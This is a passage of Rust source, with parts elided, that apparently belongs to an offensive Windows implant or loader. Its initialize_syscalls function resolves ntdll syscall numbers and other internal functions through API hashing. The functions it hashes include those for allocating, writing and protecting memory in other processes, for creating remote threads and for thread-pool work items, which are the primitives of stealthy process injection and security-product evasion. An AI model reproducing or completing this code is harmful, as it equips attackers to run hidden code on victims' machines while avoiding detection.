...
pub unsafe fn initialize_syscalls(mut ntdll: *mut c_void) -> bool { unsafe {
    ...
    resolve_ssn!(nt_allocate_virtual_memory, hashes::NTALLOCATEVIRTUALMEMORY_HASH);
    resolve_ssn!(nt_write_virtual_memory, hashes::NTWRITEVIRTUALMEMORY_HASH);
    resolve_ssn!(nt_protect_virtual_memory, hashes::NTPROTECTVIRTUALMEMORY_HASH);
    resolve_ssn!(nt_create_thread_ex, hashes::NTCREATETHREADEX_HASH);
    resolve_ssn!(nt_close, hashes::NTCLOSE_HASH);
    resolve_ssn!(nt_wait_for_single_object, hashes::NTWAITFORSINGLEOBJECT_HASH);
    ...
    resolve_ssn!(nt_query_information_process, hashes::NTQUERYINFORMATIONPROCESS_HASH);
    resolve_ssn!(nt_read_virtual_memory, hashes::NTREADVIRTUALMEMORY_HASH);
    resolve_ssn!(nt_query_system_information, hashes::NTQUERYSYSTEMINFORMATION_HASH);
    ...
    resolve_ssn!(nt_query_information_worker_factory, hashes::NTQUERYINFORMATIONWORKERFACTORY_HASH);
    ...
    resolve_ssn!(nt_query_information_token, hashes::NTQUERYINFORMATIONTOKEN_HASH);
    ...
    // Uses raw pointer to teh state to create field pointers without &mut aliasing
    {
        ...
        let mut _batch: [(u32, *mut *mut c_void); 12] = [
            ...
            (hashes::TPALLOCWORK_HASH, core::ptr::addr_of_mut!((*p).win32.tp_alloc_work)),
            (hashes::TPPOSTWORK_HASH, core::ptr::addr_of_mut!((*p).win32.tp_post_work)),
            (hashes::TPRELEASEWORK_HASH, core::ptr::addr_of_mut!((*p).win32.tp_release_work)),
            (hashes::RTLCREATEPROCESSPARAMETERSEX_HASH, core::ptr::addr_of_mut!((*p).win32.rtl_create_process_parameters_ex)),
            (hashes::RTLDESTROYPROCESSPARAMETERS_HASH, core::ptr::addr_of_mut!((*p).win32.rtl_destroy_process_parameters)),
            (hashes::CSRCLIENTCONNECTTOSERVER_HASH, core::ptr::addr_of_mut!((*p).win32.csr_client_connect_to_server)),
            (hashes::CSRCLIENTCALLSERVER_HASH, core::ptr::addr_of_mut!((*p).win32.csr_client_call_server)),
            (hashes::CSRNEWTHREAD_HASH, core::ptr::addr_of_mut!((*p).win32.csr_new_thread)),
